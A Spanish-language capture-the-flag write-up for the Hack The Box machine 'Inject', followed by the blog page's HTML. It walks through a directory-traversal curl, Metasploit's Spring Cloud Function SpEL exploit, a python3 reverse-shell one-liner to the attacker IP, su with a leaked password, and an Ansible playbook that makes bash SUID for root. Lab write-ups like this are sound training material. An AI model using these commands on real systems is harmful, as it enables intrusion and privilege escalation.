10.129.178.241 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 12:33 -04 Nmap scan report for 10.129.178.241 Host is up (0.23s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds Corre por el puerto 8080, ahora podemos ver la web correctamente. _Web Error Detectando posibles métodos de intrución Vemos un Login, lo cual podemos crear una cuanta y probar cosas pero no existe dicho archiv, y vemos un Sing Up existe, podemos probar injeciones SQL y NoSQL pero nos redirige a una página que nos induca que esta en construcción. Enumerando Directorios Usando WFUZZ veremos algunos directorios importantes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.129.178.241:8080/FUZZ 2&gt;/dev/null ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.178.241:8080/FUZZ Total requests: 220547 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000153: 200 112 L 326 W 5371 Ch &quot;blogs&quot; 000000051: 200 103 L 194 W 5654 Ch &quot;register&quot; 000000352: 200 53 L 107 W 1857 Ch &quot;upload&quot; 000001097: 500 0 L 27 W 712 Ch &quot;environment&quot; 000002694: 500 0 L 3 W 106 Ch &quot;error&quot; 000008675: 200 33 L 77 W 1086 Ch &quot;release_notes&quot; 000022957: 400 0 L 32 W 431 Ch &quot;http%3A%2F%2Fwww&quot; 000045226: 200 165 L 487 W 6657 Ch &quot;http://10.129.178.241:8080/&quot; ^C Total time: 267.0736 Processed Requests: 48259 Filtered Requests: 48251 Requests/sec.: 180.6954 La carpera /upload nos llama la atención, ingresamos a ella y podemos ver que nos dejan subir archivos Upload Si suvimos una reverse shell de PHP nos dice que solo adminte imagenes, subimos una imagen random y meremos resultados. Imagen entramos a ver la imagen y …..mmmm img?= eso huele a Directory Transversal.Podemos probar ver el /etc/passwd ingresamos la cadena Directory Transversal 1 ../../../../../../../../../../../../../../../../etc/passwd Pero no vemos nada, podemos probar con burp o curl, interceptamos la petición y la mandamos al repeater. Burpsuite Analizando mas a fondo la web podemos intentar listar la carppeta donde se guardan las paginas web /var/www/ 1 2 3 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/&#39; html WebApp la careta WebApp nos llama la atención podemos listar su contenido 1 2 3 4 5 6 7 8 9 10 11 12 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp&#39; .classpath .DS_Store .idea .project .settings HELP.md mvnw mvnw.cmd pom.xml src target Un archivo .xml, lo leemos. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 ❯ curl &#39;http://10.129.178.241:8080/show_image?img=.././../../../../../././../../../../../var/www/WebApp/pom.xml&#39; &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;WebApp&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;WebApp&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.activation&lt;/groupId&gt; &lt;artifactId&gt;javax.activation&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;5.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${parent.version}&lt;/version&gt; &lt;/plugin&gt; &lt;/plugin&gt; &lt;finalName&gt;spring-webapp&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; Viendo algunas versiones nos encontranos con Spring Cloud Function Web, buscando CVE nos encontramos que es vulnerable a SpEL Explotación Explotación manual En Proceso… Explotación con MetaSploit Nos abrimos metasploit 1 msfconsole Usando de apoyo este foro nos guiaremos.Una vez dentro de metasploit haremos lo siguiente. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 [msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/http/spring_cloud_function_spel_injection [*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set RHOST 10.129.178.241 RHOST =&gt; 10.129.178.241 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; set LHOST 10.10.14.170 LHOST =&gt; 10.10.14.170 [msf](Jobs:0 Agents:0) exploit(multi/http/spring_cloud_function_spel_injection) &gt;&gt; run [*] Started reverse TCP handler on 10.10.14.170:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable) [!] The service is running, but could not be validated. [*] Executing Linux Dropper for linux/x64/meterpreter/reverse_tcp [*] Command Stager progress - 100.00% done (823/823 bytes) [*] Sending stage (3045348 bytes) to 10.129.178.241 [*] Meterpreter session 1 opened (10.10.14.170:4444 -&gt; 10.129.178.241:43644) at 2023-03-12 21:25:11 -0400 (Meterpreter 1)(/) &gt; shell Process 76003 created. Channel 1 created. whoami &amp;&amp; id frank uid=1000(frank) gid=1000(frank) groups=1000(frank) Ahora para mayor comodidad nos pasaremos esa shell mediante reverse shell, comprobamos si esta python3 y efectivamente esta instalado. export RHOST=”10.10.14.170”;export RPORT=443;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“bash”)’ 1 2 3 4 5 6 7 En nuestra máquina nos ponemos en escucha por el puerto 443 y nos debe llegar. ```bash ❯ nc -lvnp 443 listening on [any] 443 ... connect to [10.10.14.170] from (UNKNOWN) [10.129.178.241] 48474 frank@inject:/$ Aplicamos tratamiento a la TTY Migraciñon de usuario En la carpeta personal del usuario listamos carpetas escondidad 1 2 3 frank@inject:~$ ls -a . .. .bash_history .bashrc .cache .local .m2 .profile frank@inject:~$ la carpeta .m2 nos llama la atención, listamos su contenido 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 frank@inject:~$ ls .m2 settings.xml frank@inject:~$ cat .m2/* &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;settings xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt; &lt;/settings&gt; frank@inject:~$ Vemos la contraseña del usuario phil, migramos… 1 2 3 frank@inject:~$ su phil Password:DocPhillovestoInject123 phil@inject:/home/frank$ …en su carpeta personal procedemos a leer la primera flag. 1 2 3 4 phil@inject:~$ cat user.txt be****************************36 phil@inject:~$ Escalada de Privilegios No encontramos ningun binario SUID o permiso sudo, pero si si vemos a los grupos que pertenecemos vemos un grupo extraño staff. 1 2 3 phil@inject:~$ id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) phil@inject:~$ Si listamos si tenemos capacidad para dicho grupo nos encontramos con estó. 1 2 3 4 phil@inject:~$ find / -group staff -print 2&gt;/dev/null /opt/automation/tasks /root /var/local La ruta /opt/automation/tasks nos llama la atención. ```phil@inject:~$ ls /opt/automation/tasks/ playbook_1.yml phil@inject:~$ 1 2 3 4 5 6 7 8 Si miramos el archivo se modificó recientemente, por lo cual puede que exista una tarea cron.Si volvemos a volver a checkear el archivo se modifico 2 minutos después. ```bash phil@inject:/opt/automation/tasks$ ls -lah total 12K drwxrwxr-x 2 root staff 4.0K Mar 13 01:46 . drwxr-xr-x 3 root root 4.0K Oct 20 04:23 .. -rw-r--r-- 1 root root 150 Mar 13 01:46 playbook_1.yml phil@inject:/opt/automation/tasks$ Un archivo .YML buscamos en internet el nombre del arvhivo “playbook”. Buscando en internet nos encotramos con este blog que nos lleva a un archivo de github. Creamos un archivo shell.yml con el siguiente contenido. Esto copiara la bash en y la convertirá en SUID y podemos spawnear una shell como root. 1 2 3 4 5 6 7 8 --- - name: shell hosts: localhost become: yes tasks: - name: hack shell: &quot;cp /bin/bash . &amp;&amp; chmod +sx bash&quot; Una vez pasado los 2 minutos spawneamos la shell como root con: 1 2 /usr/bin/ansible-playbook shell.yml ./bash -p Hurra!!!! somos root, procedemos a leer la flag del usuario root 1 2 3 bash-5.0# cat root.txt 4e****************************67 bash-5.0# Máquina Pwneada, sigue así muchacho.","headline":"Inject WriteUp","image":{"alt":"Inject WriteUp","url":"http://localhost:4000/assets/img/commons/inject-writeup/Inject.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/inject-writeup/"},"url":"http://localhost:4000/posts/inject-writeup/"}</script>
+<!-- End Jekyll SEO tag -->
+
+  
+
+  <title>Inject WriteUp | H4ckerLite | Blog
+  </title>
+
+  <!--
+  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
+  Generated by: https://realfavicongenerator.net/
+-->
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
+<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
+<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
+<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
+<meta name="application-name" content="H4ckerLite | Blog">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+  
+
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
+    
+      <link rel="preconnect" href="https://fonts.googleapis.com" >
+      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
+    
+      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
+      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
+    
+
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">
+
+  
+
+  <!-- GA -->
+  
+
+  <!-- Bootstrap -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">
+
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
+  
+
+  
+    <!-- Manific Popup -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
+  
+
+  <!-- JavaScript -->
+
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+
+  
+    <!--
+  Switch the mode between dark and light.
+-->
+
+<script type="text/javascript">
+  class ModeToggle {
+    static get MODE_KEY() { return "mode"; }
+    static get MODE_ATTR() { return "data-mode"; }
+    static get DARK_MODE() { return "dark"; }
+    static get LIGHT_MODE() { return "light"; }
+    static get ID() { return "mode-toggle"; }
+
+    constructor() {
+      if (this.hasMode) {
+        if (this.isDarkMode) {
+          if (!this.isSysDarkPrefer) {
+            this.setDark();
+          }
+        } else {
+          if (this.isSysDarkPrefer) {
+            this.setLight();
+          }
+        }
+      }
+
+      let self = this;
+
+      /* always follow the system prefers */
+      this.sysDarkPrefers.addEventListener("change", () => {
+        if (self.hasMode) {
+          if (self.isDarkMode) {
+            if (!self.isSysDarkPrefer) {
+              self.setDark();
+            }
+
+          } else {
+            if (self.isSysDarkPrefer) {
+              self.setLight();
+            }
+          }
+
+          self.clearMode();
+        }
+
+        self.notify();
+
+      });
+
+    } /* constructor() */
+
+    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }
+
+    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }
+
+    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }
+
+    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }
+
+    get hasMode() { return this.mode != null; }
+
+    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }
+
+    /* get the current mode on screen */
+    get modeStatus() {
+      if (this.isDarkMode
+        || (!this.hasMode && this.isSysDarkPrefer)) {
+        return ModeToggle.DARK_MODE;
+      } else {
+        return ModeToggle.LIGHT_MODE;
+      }
+    }
+
+    setDark() {
+      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
+    }
+
+    setLight() {
+      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
+      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
+    }
+
+    clearMode() {
+      $('html').removeAttr(ModeToggle.MODE_ATTR);
+      sessionStorage.removeItem(ModeToggle.MODE_KEY);
+    }
+
+    /* Notify another plugins that the theme mode has changed */
+    notify() {
+      window.postMessage({
+        direction: ModeToggle.ID,
+        message: this.modeStatus
+      }, "*");
+    }
+
+  } /* ModeToggle */
+
+  const toggle = new ModeToggle();
+
+  function flipMode() {
+    if (toggle.hasMode) {
+      if (toggle.isSysDarkPrefer) {
+        if (toggle.isLightMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setLight();
+        }
+
+      } else {
+        if (toggle.isDarkMode) {
+          toggle.clearMode();
+        } else {
+          toggle.setDark();
+        }
+      }
+
+    } else {
+      if (toggle.isSysDarkPrefer) {
+        toggle.setLight();
+      } else {
+        toggle.setDark();
+      }
+    }
+
+    toggle.notify();
+
+  } /* flipMode() */
+
+</script>
+
+  
+</head>
+
+
+  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">
+
+    <!--
+  The Side Bar
+-->
+
+<div id="sidebar" class="d-flex flex-column align-items-end">
+  <div class="profile-wrapper text-center">
+    <div id="avatar">
+      <a href="/" class="mx-auto">
+        
+          
+          <img src="/assets/img/favicons/pito.ico" alt="avatar" onerror="this.style.display='none'">
+        
+      </a>
+    </div>
+
+    <div class="site-title mt-3">
+      <a href="/">H4ckerLite | Blog</a>
+    </div>
+    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>
+
+  </div><!-- .profile-wrapper -->
+
+  <ul class="w-100">
+
+    <!-- home -->
+    <li class="nav-item">
+      <a href="/" class="nav-link">
+        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
+        <span>INICIO</span>
+      </a>
+    </li>
+    <!-- the real tabs -->
+    
+    <li class="nav-item">
+      <a href="/categories/" class="nav-link">
+        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>CATEGORÍAS</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/tags/" class="nav-link">
+        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ETIQUETAS</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/about/" class="nav-link">
+        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ACERCA DE</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+    <li class="nav-item">
+      <a href="/archives/" class="nav-link">
+        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
+        
+
+        <span>ARCHIVO</span>
+      </a>
+    </li> <!-- .nav-item -->
+    
+
+  </ul> <!-- ul.nav.flex-column -->
+
+  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">
+
+    
+      <button class="mode-toggle btn" aria-label="Switch Mode">
+        <i class="fas fa-adjust"></i>
+      </button>
+
+      
+        <span class="icon-border"></span>
+      
+    
+
+    
+      
+
+      
+      <a href="https://github.com/H4ckerLite" aria-label="github"
+        target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="https://twitter.com/mortzelo" aria-label="twitter"
+        target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
+        target="_blank" rel="noopener">
+        <i class="fas fa-cube"></i>
+      </a>
+      
+
+    
+      
+
+      
+      <a href="/feed.xml" aria-label="rss"
+        >
+        <i class="fas fa-rss"></i>
+      </a>
+      
+
+    
+
+  </div> <!-- .sidebar-bottom -->
+
+</div><!-- #sidebar -->
+
+
+    <!--
+  The Top Bar
+-->
+
+<div id="topbar-wrapper">
+  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
+    <span id="breadcrumb">
+
+    
+
+    
+
+      
+
+        
+          <span>
+            <a href="/">
+              Inicio
+            </a>
+          </span>
+
+        
+
+      
+
+        
+
+      
+
+        
+
+          
+            <span>Inject WriteUp</span>
+          
+
+        
+
+      
+
+    
+
+    </span><!-- endof #breadcrumb -->
+
+    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>
+
+    <div id="topbar-title">
+      Entrada
+    </div>
+
+    <i id="search-trigger" class="fas fa-search fa-fw"></i>
+    <span id="search-wrapper" class="align-items-center">
+      <i class="fas fa-search fa-fw"></i>
+      <input class="form-control" id="search-input" type="search"
+        aria-label="search" autocomplete="off" placeholder="Buscar...">
+    </span>
+    <span id="search-cancel" >Cancelar</span>
+  </div>
+
+</div>
+
+
+    <div id="main-wrapper" class="d-flex justify-content-center">
+      <div id="main" class="container pl-xl-4 pr-xl-4">
+
+        
+
+
+
+
+
+
+
+
+
+<div class="row">
+
+  <!-- core -->
+  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
+    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">
+
+    
+
+    
+      
+      
+        <!--
+  Refactor the HTML structure.
+-->
+
+
+
+<!--
+  In order to allow a wide table to scroll horizontally,
+  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
+-->
+
+
+
+<!--
+  Fixed kramdown code highlight rendering:
+  https://github.com/penibelst/jekyll-compress-html/issues/101
+  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
+-->
+
+
+
+<!-- Add attribute 'hide-bullet' to the checkbox list -->
+
+
+
+<!-- images -->
+
+
+
+
+  
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+
+  
+
+
+
+<!-- Add header for code snippets -->
+
+
+
+<!-- Create heading anchors -->
+
+
+
+
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
+
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+
+
+
+<!-- Wrap prompt element of blockquote with the <div> tag -->
+
+
+
+
+
+
+
+<!-- return -->
+
+
+
+
+
+<h1 data-toc-skip>Inject WriteUp</h1>
+
+<div class="post-meta text-muted">
+    <!-- published date -->
+    <span>
+      Publicado
+      <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em class=""
+    data-ts="1678550400"
+    data-df="YYYY-MM-DD"
+    data-toggle="tooltip" data-placement="bottom">
+  2023-03-11
+</em>
+
+    </span>
+
+    <!-- lastmod date -->
+    
+
+  
+    
+
+    <div class="mt-3 mb-3">
+      <img data-src="../../assets/img/commons/inject-writeup/Inject.png" class="preview-img bg"
+        alt="Inject WriteUp"
+
+      
+
+       data-proofer-ignore>
+
+      
+        <figcaption class="text-center pt-2 pb-2">Inject WriteUp</figcaption>
+      
+
+    </div>
+  
+
+  <div class="d-flex justify-content-between">
+    <!-- author -->
+    <span>
+      
+      
+
+      
+
+      Por
+
+      <em>
+        
+        H4ckerLite
+        
+      </em>
+    </span>
+
+    <div>
+      <!-- page views -->
+      
+
+      <!-- read time -->
+      <!--
+  Calculate the post's reading time, and display the word count in tooltip
+ -->
+
+
+
+<!-- words per minute  -->
+
+
+
+
+
+
+
+
+
+
+<!-- return element -->
+<span class="readtime" data-toggle="tooltip" data-placement="bottom"
+  title="1477 palabras">
+  <em>8 min</em> de lectura</span>
+
+    </div>
+
+  </div> <!-- .d-flex -->
+
+</div> <!-- .post-meta -->
+
+<div class="post-content">
+  <h1 id="imortante">Imortante</h1>
+<p>Está máquina esta en Release Arena(actualmemte <strong>Open Beta Season</strong>), por lo que la IP es de una instancia privada.</p>
+
+<p>Les explicaré cómo compremeter la máquina <a href="https://app.hackthebox.com/machines/533">Inject</a> de hackTheBox. Nos enfretaremos con una página que cuenta con una vulneravilidad de tipo <strong>Directory Transversal*, usando dicha vulnerabilidad veremos una version vulnerable de Spring que cuenta con una vulnerabilidad de tipo **RCE</strong>. Para migrar de usuario nos aprovecharemos de una contrasena filtrada. Para escalar nuestros privilegios usaremos playbook.</p>
+
+<h2 id="identificando-el-os"><span class="mr-2">Identificando el O.S</span><a href="#identificando-el-os" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
